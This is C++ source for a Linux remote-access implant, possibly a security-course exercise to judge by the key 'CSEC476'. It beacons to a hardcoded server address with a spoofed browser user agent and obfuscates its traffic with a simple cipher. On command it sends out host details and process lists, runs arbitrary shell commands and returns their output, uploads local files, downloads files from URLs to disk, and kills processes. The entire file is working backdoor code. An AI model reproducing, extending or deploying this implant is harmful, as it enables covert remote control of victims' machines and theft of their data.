#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>
#include <signal.h>
#include <dirent.h>
#include <fnmatch.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <ctime>

#include <curl/curl.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>

#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/if_link.h>
#include <sys/socket.h>
typedef unsigned int UINT;


struct Endpoints {
  std::string heartbeat;
  std::string info;
  std::string out;
  std::string ps;
  std::string upload;
};
struct Configuration {
  std::string useragent;
  std::string cookiejarfile;
  std::string protocol;
  std::string hostname;
  int port;
  Endpoints endpoints;
  int xorKey;
  std::string key;
  int sleeptime;
  int cmdtimeout;
  std::string ipCheckUrl;
  std::string readbuffer;
  std::string postfields;
  struct curl_slist *list;
  CURL *curl;
};


static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}


std::string encode(std::string key, std::string clear) {
  std::string enc = "";
  char key_c;
  std::string enc_c;
  int placeholder;

  for (UINT i = 0; i < clear.length(); i++) {
    key_c = key[i % key.length()];
    placeholder = int(clear[i]) + int(key_c);
    enc_c = (placeholder % 127);
    enc.append(enc_c);
  }
  return enc;
}


std::string decode(std::string key, std::string enc) {
  std::string dec = "";
  char key_c;
  std::string dec_c;
  int placeholder;

  for (UINT i = 0; i < enc.length(); i++) {
    key_c = key[i % key.length()];
    placeholder = 127 + int(enc[i]) - int(key_c);
    dec_c = (placeholder % 127);
    dec.append(dec_c);
  }
  return dec;
}

static size_t write_data_to_file(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}


void uploadfile(Configuration c, std::string filepath) {
  CURL *curl;
  CURLcode res;

  curl_mime *form = NULL;
  curl_mimepart *field = NULL;
  struct curl_slist *headerlist = NULL;

  curl = curl_easy_init();
  if(curl) {
    std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.upload;
    /* Create the form */
    form = curl_mime_init(curl);

    /* Fill in the file upload field */
    field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, filepath.c_str());


    /* initialize custom header list (stating that Expect: 100-continue is not
       wanted */
    /* what URL that receives this POST */
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, c.cookiejarfile.c_str());
    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, c.cookiejarfile.c_str());
    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    /* always cleanup */
    curl_easy_cleanup(curl);
    /* then cleanup the form */
    curl_mime_free(form);
  }
  return;
}


void downloadFile(std::string url, std::string path){
  CURL *curl_handle;
  FILE *pagefile;

  /* init the curl session */
  curl_handle = curl_easy_init();

  /* set URL to get here */
  curl_easy_setopt(curl_handle, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);

  /* send all data to this function  */
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data_to_file);

  /* open the file */
  pagefile = fopen(path.c_str(), "wb");
  if(pagefile) {

    /* write the page body to this file handle */
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);

    /* get it! */
    curl_easy_perform(curl_handle);

    /* close the header file */
    fclose(pagefile);
  }

  /* cleanup curl stuff */
  curl_easy_cleanup(curl_handle);
}



std::string send_enc(Configuration c, std::string data, std::string endpoint){
  std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + endpoint;
  curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());

  std::string result = encode(c.key, data);

  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDSIZE, result.length());
  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, result.c_str());
  CURLcode res = curl_easy_perform(c.curl);
  std::string returnStr = c.readbuffer;

  //reset values and return
  c.readbuffer.clear();
  c.postfields = "";
  url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.heartbeat;
  curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, c.postfields.c_str());
  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDSIZE, c.postfields.length());

  return returnStr;
}


std::string exec(const char* cmd, int timeout) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    std::time_t starttime = std::time(nullptr);
    std::cout << starttime << std::endl;
    std::cout << starttime + timeout << std::endl;
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
        std::time_t currenttime = std::time(nullptr);
        if(currenttime > starttime + timeout)
          return result;
    }
    return result;
}


std::string getProcessName(std::string pid) {
  std::string outName = "";
  std::string filename = "/proc/" + pid;
  filename += "/cmdline";
  FILE* f = fopen(filename.c_str(), "r");
  if(f){
    size_t size;
    outName.resize(1024);
    size = fread(&outName[0], sizeof(char), 1024, f);
    if (size > 0){
      if('\n' == outName[size - 1])
        outName[size-1] = '\0';
    }
    fclose(f);
  }
  return outName;
}

int filter(const struct dirent *dir)
{
     uid_t user;
     struct stat dirinfo;
     int len = strlen(dir->d_name) + 7;
     char path[len];

     strcpy(path, "/proc/");
     strcat(path, dir->d_name);
     // user = getuid();
     if (stat(path, &dirinfo) < 0) {
	  perror("processdir() ==> stat()");
	  exit(EXIT_FAILURE);
     }
     return !fnmatch("[1-9]*", dir->d_name, 0); // && user == dirinfo.st_uid;
}


std::string processdir()
{
  std::string outstr = "";
  struct dirent **namelist;
  int n;
  n = scandir("/proc", &namelist, filter, 0);
  if (n < 0)
    perror("Not enough memory.");
  else {
    while(n--) {
      outstr += namelist[n] -> d_name;
      outstr += ":";
      outstr += getProcessName(namelist[n] -> d_name);
      outstr += "&";
      free(namelist[n]);
    }
    free(namelist);
  }
  return outstr;
}


std::string getIPAddresses(){
  struct ifaddrs *ifaddr;
  int family, s;
  char host[NI_MAXHOST];
  std::string out = "";
  if (getifaddrs(&ifaddr) == -1) {
    perror("getifaddrs");
    exit(EXIT_FAILURE);
  }

   /* Walk through linked list, maintaining head pointer so we
      can free list later. */

  for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr == NULL)
      continue;
    family = ifa->ifa_addr->sa_family;

    /* For an AF_INET* interface address, display the address. */

    if (family == AF_INET) {
      s = getnameinfo(ifa->ifa_addr,(family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
      if (s != 0) {
        printf("getnameinfo() failed: %s\n", gai_strerror(s));
        exit(EXIT_FAILURE);
      }
      out += host;
      out += ",";
    }
  }
  freeifaddrs(ifaddr);
  return out;
}

/*
std::string getPublicIP(Configuration c) {
  std::string ip = "";
  c.readbuffer.clear();
  curl_easy_setopt(c.curl, CURLOPT_URL, c.ipCheckUrl.c_str());
  curl_easy_setopt(c.curl, CURLOPT_HTTPGET, 1);
  curl_easy_setopt(c.curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(c.curl, CURLOPT_WRITEDATA, &c.readbuffer);
  CURLcode res = curl_easy_perform(c.curl);
  if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
  ip = c.readbuffer;

  //reset values and return
  c.readbuffer.clear();
  c.postfields = "";
  std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.heartbeat;
  curl_easy_setopt(c.curl, CURLOPT_POST, 1);
  curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, c.postfields.c_str());
  curl_easy_setopt(c.curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(c.curl, CURLOPT_WRITEDATA, &c.readbuffer);
  return ip;
}
*/

std::string gatherSystemInfo(Configuration c){
  std::string out = "";
  std::string publicIP = "-";
  out += publicIP;
  out += "&";
  std::string username = getlogin();
  out += username;
  out += "&";
  struct utsname unameData;
  struct sysinfo systemInfo;
  if(!uname(&unameData)) {
    out += unameData.nodename;
    out += "&";
    out += "-";
    out += "&";
    if(!sysinfo(&systemInfo)){
      out += std::to_string(systemInfo.totalram);
      out += "&";
    }
    out += getIPAddresses();
    out += "&";
    out += unameData.release;
    out += " ";
    out += unameData.version ;
    out += " ";
    out += unameData.machine;
  }
  return out;
}

int main(void)
{
  CURL *curl;
  CURLcode res;
  struct curl_slist *list = NULL;
  std::string readbuffer = "";
  std::string postfields = "";
  Endpoints e {.heartbeat="/heartbeat", .info="/info", .out="/out", .ps="/ps", .upload="/upload"};
  Configuration c {.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", .cookiejarfile="/tmp/cookies.txt", .protocol="http", .hostname="127.0.0.1", .port=5000, .endpoints=e, .xorKey=0x7f, .key="CSEC476", .sleeptime=4, .cmdtimeout=10,.ipCheckUrl="http://ifconfig.me/ip", .readbuffer=readbuffer, postfields=postfields, .list=list, .curl=curl};
  c.hostname = "129.21.62.93";
  std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.heartbeat;
  c.curl = curl_easy_init();

  if(c.curl) {
    list = curl_slist_append(list, "Content-Type: Data");
    curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(c.curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(c.curl, CURLOPT_COOKIEJAR, c.cookiejarfile.c_str());
    curl_easy_setopt(c.curl, CURLOPT_COOKIEFILE, c.cookiejarfile.c_str());
    curl_easy_setopt(c.curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(c.curl, CURLOPT_WRITEDATA, &c.readbuffer);
    curl_easy_setopt(c.curl, CURLOPT_USERAGENT, c.useragent.c_str());
    curl_easy_setopt(c.curl, CURLOPT_POST, 1);
    curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, c.postfields.c_str());
    curl_easy_setopt(c.curl, CURLOPT_HTTPHEADER, list);

    /*
	Initial post to /heartbeat to get the cookie
	while true
		send request + process response
		decode
		get action code (1,2,3...etc)
		switch atoi(action code)
    */


    int i = 0;
    while(i < 10){
      res = curl_easy_perform(c.curl);
      /* Check for errors */
      if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
      std::cout << "=============:)===============" << std::endl;
      std::string response = decode(c.key, c.readbuffer);

      std::string code = response.substr(0, response.find(" "));
      int first;
      int second;
      switch (atoi(code.c_str())){
      case 1:
        //OK
        std::cout << "Recv 1" << std::endl;
        break;
      case 2:
        std::cout << "Recv 2" << std::endl;
        send_enc(c, gatherSystemInfo(c), c.endpoints.info);
        break;
      case 3:
        std::cout << "Recv 3" << std::endl;
        std:: cout << processdir() << std::endl;
        send_enc(c, processdir(), c.endpoints.ps);
        break;
      case 4:
        std::cout << "Recv 4" << std::endl;
	send_enc(c, exec(response.substr(response.find(" ") + 1).c_str(), c.cmdtimeout), c.endpoints.out);
        break;
      case 5:
        std::cout << "Recv 5" << std::endl;
	std::cout << response.substr(response.find(" ") + 1).c_str() << std::endl;
        uploadfile(c, response.substr(response.find(" ") + 1));
        break;
      case 6:
        std::cout << "Recv 6" << std::endl;
        first = response.find(" ");
        second = response.find(" ", first+1);
        std::cout << response.substr(first+1, second-2) << response.substr(second+1) << std::endl;
        downloadFile(response.substr(first+1, second-2), response.substr(second+1));
        break;
      case 7:
        std::cout << "Recv 7" << std::endl;
        kill(atoi(response.substr(response.find(" ") + 1).c_str()), SIGTERM);
        break;
      default:
        std::cout << "Unknown command: " << response << std::endl;
        break;
      }
      c.readbuffer.clear();
      sleep(c.sleeptime);
      i++;
    }
    curl_slist_free_all(list);
    curl_easy_cleanup(c.curl);
  }
  return 0;
}
